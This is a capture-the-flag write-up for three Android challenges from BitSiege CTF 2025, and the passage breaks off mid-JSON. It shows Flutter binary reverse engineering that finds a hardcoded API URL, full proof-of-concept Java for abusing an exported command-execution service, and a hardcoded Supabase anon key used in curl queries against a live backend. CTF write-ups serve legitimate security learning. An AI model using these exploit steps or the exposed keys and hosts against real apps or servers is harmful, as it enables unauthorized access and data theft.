---
author: 0xbinder
layout: post
title: BitSiege CTF 2025
date: '2025-05-22'
description: "BitSiege CTF by bitwall.ke"
useRelativeCover: true
categories: [Capture The Flag]
---

# ANDROID
## Inviscible

We are provided with an Android App Bundle `invincible.aab`, a publishing format introduced by Google. Unlike APK files, it is not directly installable because it serves as a bundle of compiled code and resources. Its purpose is to allow Google Play to generate optimized APKs tailored to each user's device.

We have to convert the `aab` to `apk` for direct installation. To do that we use a tool called `bundletool` you can learn more about the tool here https://developer.android.com/tools/bundletool.
we use this command to generate a universal apk `bundletool build-apks --bundle=invincible.aab --output=./invincible/myapp.apks --mode=universal`

```bash
~/Downloads/invincible
❯ ls
 myapp.apks
```

The `toc.pb` file inside a .apks archive stands for "Table of Contents" in Protocol Buffer format `.pb`. It’s used by bundletool, the tool that handles .apks files, to keep track of all the APKs included in the archive

```bash
~/Downloads/invincible
❯ unzip myapp.apks
Archive:  myapp.apks
 extracting: toc.pb
 extracting: universal.apk
```

When we try to install the apk we get an error. The apk is not signed we need to sign it. We can sign it using the bundletool or manually.

```bash
adb install universal.apk
Performing Streamed Install
adb: failed to install universal.apk: Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl128081372.tmp/base.apk: Attempt to get length of null array]
```

We generate keystore to sign in the app

```bash
❯ keytool -genkey -v -keystore invincible.jks -keyalg RSA -keysize 2048 -validity 10000 -alias invincible
Enter keystore password:
Re-enter new password:
What is your first and last name?
  [Unknown]:
What is the name of your organizational unit?
  [Unknown]:
What is the name of your organization?
  [Unknown]:
What is the name of your City or Locality?
  [Unknown]:
What is the name of your State or Province?
  [Unknown]:
What is the two-letter country code for this unit?
  [Unknown]:
Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?
  [no]:  yes

Generating 2,048 bit RSA key pair and self-signed certificate (SHA256withRSA) with a validity of 10,000 days
	for: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown
[Storing invincible.jks]
```

we sign in the apk using apksigner https://developer.android.com/tools/apksigner

```bash
❯ apksigner sign --ks invincible.jks --ks-key-alias invincible --out universal-signed.apk universal.apk
Keystore password for signer #1:
```

we can now install the apk and see what it does

```bash
❯ adb install universal-signed.apk
Performing Incremental Install
Serving...
Unknown command: install-incremental
Performing Streamed Install
Success
```

We can now see the apk. We see server response, which gives us an hint that the apk calls a server somewhere.

![img-desc](1.png)

we decompile the app with apktool to understand the apk

```bash
apktool d universal.apk
```

in the lib folder we find libflutter.so binary which is the flutter engine. This suggests the apk is a flutter app.

```bash
universal/lib/arm64-v8a
❯ ls
 libapp.so
 libflutter.so
```

The libapp.so is the code written by the developer. Next lets decompile the binary and understand the code. We can use `blutter` tool to do that.


```bash
❯ python blutter.py /home/plaintext/Downloads/invincible/universal/lib/arm64-v8a invincible/
Dart version: 3.7.2, Snapshot: d91c0e6f35f0eb2e44124e8f42aa44a7, Target: android arm64
flags: product no-code_comments dwarf_stack_traces_mode dedup_instructions no-tsan no-msan arm64 android compressed-pointers
libapp is loaded at 0x7611d9200000
Dart heap at 0x761000000000
Analyzing the application
Dumping Object Pool
Generating application assemblies
Generating Frida script
```

The code in obfuscated and so if you need to understand how it works. You can use `radare` and dynamic instrumentation with the `frida` script. We have a `pp.txt` file that contains all the objects for the dart vm. We have the offset to access all the objects in the code.

```json
pool heap offset: 0x380080
[pp+0x10] Stub: Subtype7TestCache (0xf24f0)
[pp+0x18] Stub: Subtype6TestCache (0xf27cc)
[pp+0x20] Stub: Subtype4TestCache (0xf2a74)
```

we search for http strings and we come across this.

```json
[pp+0xa2f8] AnonymousClosure: (0x1d8548), in [Cwe] _Oda::<anonymous closure> (0x1ea714)
[pp+0xa300] String: "http://34.207.249.121:8000/api/v1/"
[pp+0xa308] AnonymousClosure: (0x205d90), of [Cwe] _Oda
[pp+0xa310] AnonymousClosure: (0x205d60), of [Cwe] _Oda
[pp+0xa318] AnonymousClosure: (0x205d30), of [Cwe] _Oda
[pp+0xa320] String: "Error occured"
[pp+0xa328] String: "Failed to fetch"
[pp+0xa330] String: "message"
```

we have the offset `pp+0xa300` and so we add it to our heap offset `pool heap offset: 0x380080`.This is how the dart object are referenced from the pool. Notice the first part `#a` its from `0xa` and the other part `#0x300` from `300`. This is for arm64 architecture.

```c
ADD x5 , x27 #a, LSL#12
LDR x5, [x5, #0x300]
```

And so you can use this pattern to get where the function is in radare

```
"/ad/ add.*, x27, 0xa, lsl 12;0x300]"
```

This is where the index of the dart object is resolved

```bash
[0x000e0000]> "/ad/ add.*, x27, 0xa, lsl 12;0x300]"
0x0035bb10             612b4091  add x1, x27, 0xa, lsl 12
0x0035bb14             218041f9  ldr x1, [x1, section..hash]
```

if you seek to that offset you'll get the assembly code for the function

```bash
[0x000e0000]> s 0x0035bb10
[0x0035bb10]> pdf
        ╎   ; CALL XREF from fcn.001ea714 @ 0x1ea770(x)
        ╎   ; CALL XREF from fcn.0020c594 @ 0x20c660(x)
┌ 256: fcn.0035bad0 (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4, int64_t arg5, int64_t arg6, int64_t arg7, int64_t arg8);
│ `- args(x0, x1, x2, x3, x4, x5, x6, x7)
│       ╎   0x0035bad0      fd79bfa9       stp x29, x30, [x15, -0x10]!
│       ╎   0x0035bad4      fd030faa       mov x29, x15
│       ╎   0x0035bad8      ef0102d1       sub x15, x15, 0x80
│       ╎   0x0035badc      b6831ff8       stur x22, [x29, -8]
│       ╎   0x0035bae0      a18319f8       stur x1, [x29, -0x68]       ; arg2
│       ╎   0x0035bae4      501f40f9       ldr x16, [x26, 0x38]
│       ╎   0x0035bae8      ff0110eb       cmp x15, x16
│      ┌──< 0x0035baec      e9070054       b.ls 0x35bbe8
│      │╎   ; CODE XREF from fcn.0035bad0 @ 0x35bbec(x)
│     ┌───> 0x0035baf0      410080d2       mov x1, 2
│     ╎│╎   0x0035baf4      8b540094       bl fcn.00370d20
│     ╎│╎   0x0035baf8      e20300aa       mov x2, x0
│     ╎│╎   0x0035bafc      a18359f8       ldur x1, [x29, -0x68]
│     ╎│╎   0x0035bb00      a20319f8       stur x2, [x29, -0x70]
│     ╎│╎   0x0035bb04      41f000b8       stur w1, [x2, 0xf]
│     ╎│╎   0x0035bb08      607f41f9       ldr x0, [x27, 0x2f8]        ; int64_t arg1
│     ╎│╎   0x0035bb0c      08aeff97       bl fcn.0034732c
│     ╎│╎   ;-- hit4_1:
│     ╎│╎   0x0035bb10      612b4091       add x1, x27, 0xa, lsl 12
│     ╎│╎   0x0035bb14      218041f9       ldr x1, [x1, 0x300]         ; [0x300:4]=6
│     ╎│╎                                                              ; section..hash
│     ╎│╎                                                              [04] -r-- section size 56 named .hash
│     ╎│╎   0x0035bb18      641342f9       ldr x4, [x27, 0x420]
│     ╎│╎   0x0035bb1c      20d1f697       bl fcn.0010ff9c
│     ╎│╎   0x0035bb20      a08318f8       stur x0, [x29, -0x78]
│     ╎│╎   0x0035bb24      e10300aa       mov x1, x0
│     ╎│╎   0x0035bb28      2b44fa97       bl fcn.001ecbd4
│     ╎│╎   0x0035bb2c      e10300aa       mov x1, x0
│     ╎│╎   0x0035bb30      a10318f8       stur x1, [x29, -0x80]
│     ╎│╎   0x0035bb34      6eadff97       bl fcn.003470ec
│     ╎│╎   0x0035bb38      a08318f8       stur x0, [x29, -0x78]
│     ╎│╎   0x0035bb3c      01b040f8       ldur x1, [x0, 0xb]
│     ╎│╎   0x0035bb40      3f2003f1       cmp x1, 0xc8
│    ┌────< 0x0035bb44      e1020054       b.ne 0x35bba0
│    │╎│╎   0x0035bb48      a20359f8       ldur x2, [x29, -0x70]
│    │╎│╎   0x0035bb4c      e10300aa       mov x1, x0
│    │╎│╎   0x0035bb50      203bfa97       bl fcn.001ea7d0
│    │╎│╎   0x0035bb54      e10300aa       mov x1, x0
│    │╎│╎   0x0035bb58      0d3bfa97       bl fcn.001ea78c
│    │╎│╎   0x0035bb5c      a30359f8       ldur x3, [x29, -0x70]
│    │╎│╎   0x0035bb60      603001b8       stur w0, [x3, 0x13]
│   ┌─────< 0x0035bb64      e0000036       tbz w0, 0, 0x35bb80
│   ││╎│╎   0x0035bb68      70f05f38       ldurb w16, [x3, -1]
│   ││╎│╎   0x0035bb6c      11f05f38       ldurb w17, [x0, -1]
│   ││╎│╎   0x0035bb70      300a508a       and x16, x17, x16, lsr 2
│   ││╎│╎   0x0035bb74      1f825cea       tst x16, x28, lsr 32
│  ┌──────< 0x0035bb78      40000054       b.eq 0x35bb80
│  │││╎│╎   0x0035bb7c      68520094       bl fcn.0037051c
│  │││╎│╎   ; CODE XREFS from fcn.0035bad0 @ 0x35bb64(x), 0x35bb78(x)
│  └└─────> 0x0035bb80      e20303aa       mov x2, x3
│    │╎│╎   0x0035bb84      612b4091       add x1, x27, 0xa, lsl 12
│    │╎│╎   0x0035bb88      218441f9       ldr x1, [x1, 0x308]
│    │╎│╎   0x0035bb8c      56550094       bl fcn.003710e4
│    │╎│╎   0x0035bb90      a18359f8       ldur x1, [x29, -0x68]
│    │╎│╎   0x0035bb94      e20300aa       mov x2, x0
│    │╎│╎   0x0035bb98      d372f697       bl fcn.000f86e4
│   ┌─────< 0x0035bb9c      11000014       b 0x35bbe0
│   ││╎│╎   ; CODE XREF from fcn.0035bad0 @ 0x35bb44(x)
│   │└────> 0x0035bba0      a20359f8       ldur x2, [x29, -0x70]
│   │ ╎│╎   0x0035bba4      612b4091       add x1, x27, 0xa, lsl 12
│   │ ╎│╎   0x0035bba8      218841f9       ldr x1, [x1, 0x310]
│   │ ╎│╎   0x0035bbac      4e550094       bl fcn.003710e4
│   │ ╎│╎   0x0035bbb0      a18359f8       ldur x1, [x29, -0x68]
│   │ ╎│╎   0x0035bbb4      e20300aa       mov x2, x0
│   │ ╎│╎   0x0035bbb8      cb72f697       bl fcn.000f86e4
│   │┌────< 0x0035bbbc      09000014       b 0x35bbe0
..
│   ││╎│╎   ; CODE XREFS from fcn.0035bad0 @ 0x35bb9c(x), 0x35bbbc(x)
│   └└────> 0x0035bbe0      e00316aa       mov x0, x22
│     ╎│└─< 0x0035bbe4      7ca7ff17       b 0x3459d4                  ; fcn.003785cc-0x32bf8
│     ╎│    ; CODE XREF from fcn.0035bad0 @ 0x35baec(x)
│     ╎└──> 0x0035bbe8      b4580094       bl fcn.00371eb8
└     └───< 0x0035bbec      c1ffff17       b 0x35baf0
```

You can do more research on how the instructions work. So basically we got the url `[pp+0xa300] String: "http://34.207.249.121:8000/api/v1/"`. so after calling it we get this response.

```bash
❯ curl -X GET "http://34.207.249.121:8000/api/v1/"
{"message":"Hackers always think they are invincible"}
```

From wappalyzer we get this info

```
Documentation tools
Swagger UI
Web frameworks
FastAPI
```

Since the swagger is available we navigate to docs and find the invincible path and some secret the developer forgot to remove during production.

![img-desc](2.png)

we call the endpoint and get the flag.

```bash
❯ curl -X 'GET' \
        'http://34.207.249.121:8000/api/v1/invincible_path?invincible_hash=70a9428d8aebe403692ecc4b4148e17bad0c4859' \
        -H 'accept: application/json'
{"message":" {1n53cur3_1nv1n51bl3_4p1_6b09cef20deb76d89a3e00ba0a83de30}"}⏎
```

Invincible? Bro, even Eve could’ve solved this blindfolded.
![yay](1.gif)

## Watcher

Let's decompile the apk with `jadx-gui` and checkout the `AndroidManifest.xml` file. We notice an exported service `com.example.watcher.WatcherService` and the `MainActivity`

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    android:versionCode="1"
    android:versionName="1.0"
    android:compileSdkVersion="36"
    android:compileSdkVersionCodename="16"
    package="com.example.watcher"
    platformBuildVersionCode="36"
    platformBuildVersionName="16">
    ...
    <application
    ...
        android:dataExtractionRules="@xml/data_extraction_rules">
        <service
            android:name="com.example.watcher.WatcherService"
            android:enabled="true"
            android:exported="true"/>
        <activity
            android:name="com.example.watcher.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

Analyzing the service we find out the following.
1. The `<service>` tag in `AndroidManifest.xml` with `android:exported="true"` makes this service accessible to other applications.
2. `Messenger` for Inter-Process Communication (IPC): It uses a `Messenger` to handle communication with other app components. This allows other processes to send messages to the service and receive replies.
3. `IncomingHandler`: This inner class extends `Handler` and runs on the main thread's Looper. It processes incoming Message objects.
> 1. `MSG_ECHO` (1): Displays a received string in a Toast.
> 2. `MSG_GET_SECRET` (2): Generates a unique secret string (UUID) and sends it back as a reply.
> 3. `MSG_RUN_COMMAND` (3): Receives a `secret` and a `command`. Security Check: Verifies if the provided `secret` matches the last generated one. If not, it denies access.
4. Command Execution: If the `secret` is valid, it calls `Handlers.executeCommand()` to run the provided command.
5. Reply: Sends the output of the command (or an error message) back to the sender.
6. `onBind(Intent intent)`: This method is called when another component wants to bind to the service. It returns the `IBinder` associated with the `Messenger`, enabling communication.
7. `sendReply(Message message, String reply)`: A helper method to send a reply Message back to the original sender, including the provided reply data in a `Bundle`.

In essence, WatcherService exposes functionality to other apps to get a temporary secret and then use that secret to execute system commands.

```java
package com.example.watcher;

...

/* loaded from: classes3.dex */
public class WatcherService extends Service {
    public static final int MSG_ECHO = 1;
    public static final int MSG_GET_SECRET = 2;
    public static final int MSG_RUN_COMMAND = 3;
    private String currentRequestedSecret = null;
    final Messenger messenger = new Messenger(new IncomingHandler(Looper.getMainLooper()));

    class IncomingHandler extends Handler {
        String authenticatedSecret;
        String echo;

        IncomingHandler(Looper looper) {
            super(looper);
            this.authenticatedSecret = null;
            this.echo = "";
        }

        @Override // android.os.Handler
        public void handleMessage(Message message) {
            switch (message.what) {
                case 1:
                    this.echo = message.getData().getString("echo");
                    Toast.makeText(WatcherService.this.getApplicationContext(), this.echo, 0).show();
                    break;
                case 2:
                    WatcherService.this.currentRequestedSecret = UUID.randomUUID().toString();
                    WatcherService.this.sendReply(message, WatcherService.this.currentRequestedSecret);
                    break;
                case 3:
                    String providedSecret = message.getData().getString("secret");
                    String command = message.getData().getString("command");
                    if (command == null || command.isEmpty()) {
                        WatcherService.this.sendReply(message, "Error");
                        break;
                    } else if (WatcherService.this.currentRequestedSecret == null || !WatcherService.this.currentRequestedSecret.equals(providedSecret)) {
                        WatcherService.this.sendReply(message, "Access Denied: Invalid or Expired Secret");
                        break;
                    } else {
                        try {
                            String commandOutput = Handlers.executeCommand(command);
                            WatcherService.this.sendReply(message, commandOutput);
                            WatcherService.this.currentRequestedSecret = null;
                            break;
                        } catch (Exception e) {
                            WatcherService.this.sendReply(message, "Error");
                            return;
                        }
                    }
                    break;
                default:
                    super.handleMessage(message);
                    break;
            }
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return this.messenger.getBinder();
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void sendReply(Message message, String reply) {
        try {
            Message replyMessage = Message.obtain((Handler) null, message.what);
            Bundle bundle = new Bundle();
            bundle.putString("reply", reply);
            replyMessage.setData(bundle);
            message.replyTo.send(replyMessage);
        } catch (RemoteException e) {
        }
    }
}
```

Analyzing `Handlers`

This Java code defines a utility class Handlers with a static method:

1. `executeCommand(String doubleEncodedCommand)`:
        Double `Base64` Decoding: It attempts to decode the input doubleEncodedCommand twice using `Base64` `(if the Android SDK version is 26 or higher)`.
2. Command Execution: It uses `Runtime.getRuntime().exec()` to execute the decoded command.
3. Output Capture: It reads the standard output and error streams of the executed command.
4. Result Aggregation: It builds a string containing the command's output and exit value (and potentially "ERROR" if anything was written to the error stream).
5. Return Value: It returns the aggregated output string.

```java
...
/* loaded from: classes3.dex */
public class Handlers {
    public static String executeCommand(String doubleEncodedCommand) throws Exception {
        String singleDecodedCommand = null;
        if (Build.VERSION.SDK_INT >= 26) {
            singleDecodedCommand = new String(Base64.getDecoder().decode(doubleEncodedCommand));
        }
        String command = null;
        if (Build.VERSION.SDK_INT >= 26) {
            command = new String(Base64.getDecoder().decode(singleDecodedCommand));
        }
        Process process = Runtime.getRuntime().exec(command);
        StringBuilder output = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        try {
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while (true) {
                try {
                    String line = reader.readLine();
                    if (line == null) {
                        break;
                    }
                    output.append(line).append("\n");
                } finally {
                }
            }
            while (errorReader.readLine() != null) {
                output.append("ERROR");
            }
            int exitValue = process.waitFor();
            output.append("Exit Value: ").append(exitValue);
            errorReader.close();
            reader.close();
            return output.toString();
        } catch (Throwable th) {
            try {
                reader.close();
            } catch (Throwable th2) {
                th.addSuppressed(th2);
            }
            throw th;
        }
    }
}
```

So to run commands we need to
1. Bind to the service.
2. Request a secret.
3. Send a double encoded command with the secret.
4. Receive the ouput back.


We create the `MainActivity.Java`

```java
package com.example.watcherpoc;

import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.RemoteException;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "WatcherPOC";
    private static final int MSG_ECHO = 1;
    private static final int MSG_GET_SECRET = 2;
    private static final int MSG_RUN_COMMAND = 3;

    private Messenger serviceMessenger;
    private TextView outputTextView;
    private Button bindButton;
    private Button getSecretButton;
    private Button sendCommandButton;
    private EditText commandInput;

    private String currentSecret = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        // Initialize views
        bindButton = findViewById(R.id.button);
        getSecretButton = findViewById(R.id.getSecretButton);
        sendCommandButton = findViewById(R.id.sendCommandButton);
        outputTextView = findViewById(R.id.textView);
        commandInput = findViewById(R.id.commandInput);

        // Initially disable buttons
        getSecretButton.setEnabled(false);
        sendCommandButton.setEnabled(false);

        // Bind button click to bind service
        bindButton.setOnClickListener(view -> {
            Log.i(TAG, "Binding to service");
            Intent intent = new Intent();
            intent.setClassName("com.example.watcher", "com.example.watcher.WatcherService");
            bindService(intent, serviceConnection, BIND_AUTO_CREATE);
        });

        // Get Secret button click
        getSecretButton.setOnClickListener(view -> {
            if (serviceMessenger != null) {
                requestSecret();
            }
        });

        // Send command button click
        sendCommandButton.setOnClickListener(view -> {
            String command = commandInput.getText().toString().trim();
            if (!command.isEmpty() && serviceMessenger != null && currentSecret != null) {
                sendCommand(command, currentSecret);
            } else {
                Toast.makeText(this, "Get secret first or enter a command", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private class IncomingHandler extends Handler {
        IncomingHandler() {
            super(Looper.getMainLooper());
        }

        @Override
        public void handleMessage(@NonNull Message msg) {
            Bundle data = msg.getData();
            if (data != null) {
                String reply = data.getString("reply");
                Log.d(TAG, "Received message type " + msg.what + ": " + reply);

                runOnUiThread(() -> {
                    switch (msg.what) {
                        case MSG_GET_SECRET:
                            if (reply != null) {
                                currentSecret = reply;
                                outputTextView.setText("Secret received. You can now send a command.");
                                sendCommandButton.setEnabled(true);
                            }
                            break;
                        case MSG_RUN_COMMAND:
                            if (reply != null) {
                                outputTextView.setText(reply);
                                // Reset secret after command execution
                                currentSecret = null;
                                sendCommandButton.setEnabled(false);
                                getSecretButton.setEnabled(true);
                            }
                            break;
                        case MSG_ECHO:
                            outputTextView.setText(reply);
                            break;
                    }
                });
            }
        }
    }

    private final Messenger clientMessenger = new Messenger(new IncomingHandler());

    private final ServiceConnection serviceConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            serviceMessenger = new Messenger(service);

            // Send initial echo message
            sendEchoMessage();

            // Enable get secret button
            runOnUiThread(() -> {
                getSecretButton.setEnabled(true);
                Log.i(TAG, "Service connected");
            });
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            serviceMessenger = null;
            runOnUiThread(() -> {
                getSecretButton.setEnabled(false);
                sendCommandButton.setEnabled(false);
                Log.i(TAG, "Service disconnected");
            });
        }
    };

    private void sendEchoMessage() {
        try {
            Message message = Message.obtain(null, MSG_ECHO);
            Bundle bundle = new Bundle();
            bundle.putString("echo", "Hello Watcher Service");
            message.setData(bundle);
            message.replyTo = clientMessenger;
            serviceMessenger.send(message);
        } catch (RemoteException e) {
            Log.e(TAG, "Error sending echo message", e);
        }
    }

    private void requestSecret() {
        try {
            Message message = Message.obtain(null, MSG_GET_SECRET);
            message.replyTo = clientMessenger;
            serviceMessenger.send(message);

            // Disable get secret button to prevent multiple requests
            getSecretButton.setEnabled(false);
        } catch (RemoteException e) {
            Log.e(TAG, "Error requesting secret", e);
            outputTextView.setText("Error: " + e.getMessage());
        }
    }

    private void sendCommand(String command, String secret) {
        try {
            Message message = Message.obtain(null, MSG_RUN_COMMAND);
            Bundle bundle = new Bundle();
            bundle.putString("command", command);
            bundle.putString("secret", secret);
            message.setData(bundle);
            message.replyTo = clientMessenger;
            serviceMessenger.send(message);
        } catch (RemoteException e) {
            Log.e(TAG, "Error sending command", e);
            outputTextView.setText("Error: " + e.getMessage());
        }
    }
}
```

The `activity_main.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<androidx.constraintlayout.widget.ConstraintLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:app="http://schemas.android.com/apk/res-auto"
    xmlns:tools="http://schemas.android.com/tools"
    android:id="@+id/main"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    tools:context=".MainActivity">

    <Button
        android:id="@+id/button"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Bind Service"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintHorizontal_bias="0.498"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintVertical_bias="0.33" />

    <TextView
        android:id="@+id/textView"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:text="Output"
        android:padding="16dp"
        app:layout_constraintTop_toTopOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        android:layout_marginTop="16dp"
        android:textAlignment="center"/>

    <Button
        android:id="@+id/getSecretButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Get Secret"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toStartOf="@+id/sendCommandButton"
        app:layout_constraintHorizontal_chainStyle="packed"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/button"
        app:layout_constraintVertical_bias="0.3"
        android:layout_marginEnd="16dp"/>

    <Button
        android:id="@+id/sendCommandButton"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Send Command"
        app:layout_constraintBottom_toBottomOf="parent"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toEndOf="@+id/getSecretButton"
        app:layout_constraintTop_toBottomOf="@+id/button"
        app:layout_constraintVertical_bias="0.3"/>

    <EditText
        android:id="@+id/commandInput"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:hint="Enter command"
        android:layout_marginHorizontal="16dp"
        app:layout_constraintBottom_toTopOf="@+id/sendCommandButton"
        app:layout_constraintEnd_toEndOf="parent"
        app:layout_constraintStart_toStartOf="parent"
        app:layout_constraintTop_toBottomOf="@+id/textView"
        app:layout_constraintVertical_bias="0.5"/>
</androidx.constraintlayout.widget.ConstraintLayout>
```

we now click
1. Bind service
2. Get secret
3. We input our command and click send

Running that we get the result back

![img-desc](3.png)

## Pain

Just as the invincible challenge we have an app bundle. `pain.aab`. We need to convert it to `apk` using bundletool `bundletool build-apks --bundle=pain.aab --output=./pain/myapp.apks --mode=universal`

```bash
~/Downloads/pain
❯ ls
 myapp.apks
```

we then unzip the `myapp.apks` file.

```bash
~/Downloads/invincible
❯ unzip myapp.apks
Archive:  myapp.apks
 extracting: toc.pb
 extracting: universal.apk
```

For signing the apk follow the same instructions above for `invincible`. After that we install the apk. Opening the apk we find the six paths of pain. We notice only 5 items are available after scrolling. So we need to find the last path details.

![img-desc](4.png)

After decompiling the apk with `apktool` and `blutter` we search for `http` strings and come across these. This suggest that the apk calls supabase

```json
[pp+0x4618] String: "supabase.supabase"
[pp+0x4620] String: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I"
[pp+0x4628] String: "https://qzuqulwyiktbcmtjipsr.supabase.co/rest/v1"
[pp+0x4630] String: "https://qzuqulwyiktbcmtjipsr.supabase.co/realtime/v1"
[pp+0x4638] String: "ws"
[pp+0x4640] String: "https://qzuqulwyiktbcmtjipsr.supabase.co/auth/v1"
[pp+0x4648] String: "https://qzuqulwyiktbcmtjipsr.supabase.co/storage/v1"
[pp+0x4650] String: "https://qzuqulwyiktbcmtjipsr.supabase.co/functions/v1"
```

we make the query to the api using the `Authorization` and `apikey` value. Its returns the swagger which shows us a table `pain_paths`

```bash
❯ curl --request GET \
        --url https://qzuqulwyiktbcmtjipsr.supabase.co/rest/v1/ \
        --header 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I' \
        --header 'User-Agent: insomnia/10.3.1' \
        --header 'apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF6dXF1bHd5aWt0YmNtdGppcHNyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDYwODY5NzIsImV4cCI6MjA2MTY2Mjk3Mn0.nzqx2c336xykkqlyCVfH8iHq5AZpT6wzC_gtJTHZ_3I'
{"swagger":"2.0","info":{"description":"","title":"standard public schema","version":"12.2.3 (519615d)"},"host":"qzuqulwyiktbcmtjipsr.supabase.co:443","basePath":"/","schemes":["https"],"consumes":["application/json","application/vnd.pgrst.object+json;nulls=stripped","application/vnd.pgrst.object+json","text/csv"],"produces":["application/json","application/vnd.pgrst.object+json;nulls=stripped","application/vnd.pgrst.object+json","text/csv"],"paths":{"/":{"get":{"produces":["application/openapi+json","application/json"],"responses":{"200":{"description":"OK"}},"summary":"OpenAPI description (this document)","tags":["Introspection"]}},"/pain_paths":{"get":{"parameters":[{"$ref":"#/parameters/rowFilter.pain_paths.id"},{"$ref":"#/parameters/rowFilter.pain_paths.created_at"},{"$ref":"#/parameters/rowFilter.pain_paths.name"},{"$ref":"#/parameters/rowFilter.pain_paths.image_url"},{"$ref":"#/parameters/rowFilter.pain_paths.description"},{"$ref":"#/parameters/rowFilter.pain_paths.ability"},{"$ref":"#/parameters/rowFilter.pain_paths.is_private"},{"$ref":"#/parameters/select"},{"$ref":"#/parameters/order"},{"$ref":"#/parameters/range"},{"$ref":"#/parameters/rangeUnit"},{"$ref":"#/parameters/offset"},{"$ref":"#/parameters/limit"},{"$ref":"#/parameters/preferCount"}],"responses":{"200":{"description":"OK","schema":{"items":{"$ref":"#/definitions/pain_paths"},"type":"array"}},"206":{"description":"Partial Content"}},"tags":["pain_paths"]},"post":{"parameters":[{"$ref":"#/parameters/body.pain_paths"},{"$ref":"#/parameters/select"},{"$ref":"#/parameters/preferPost"}],"responses":{"201":{"description":"Created"}},"tags":["pain_paths"]},"delete":{"parameters":[{"$ref":"#/parameters/rowFilter.pain_paths.id"},{"$ref":"#/parameters/rowFilter.pain_paths.created_at"},{"$ref":"#/parameters/rowFilter.pain_paths.name"},{"$ref":"#/parameters/rowFilter.pain_paths.image_url"},{"$ref":"#/parameters/rowFilter.pain_paths.description"},{"$ref":"#/parameters/rowFilter.pain_paths.ability"},{"$ref":"#/parameters/rowFilter.pain_paths.is_private"},{"$ref":"#/parameters/preferReturn"}],"responses":{"204":{"description":"No Content"}},"tags":["pain_paths"]},"patch":{"parameters":[{"$ref":"#/parameters/rowFilter.pain_paths.id"},{"$ref":"#/parameters/rowFilter.pain_paths.created_at"},{"$ref":"#/parameters/rowFilter.pain_paths.name"},{"$ref":"#/parameters/rowFilter.pain_paths.image_url"},{"$ref":"#/parameters/rowFilter.pain_paths.description"},{"$ref":"#/parameters/rowFilter.pain_paths.ability"},{"$ref":"#/parameters/rowFilter.pain_paths.is_private"},{"$ref":"#/parameters/body.pain_paths"},{"$ref":"#/parameters/preferReturn"}],"responses":{"204":{"description":"No 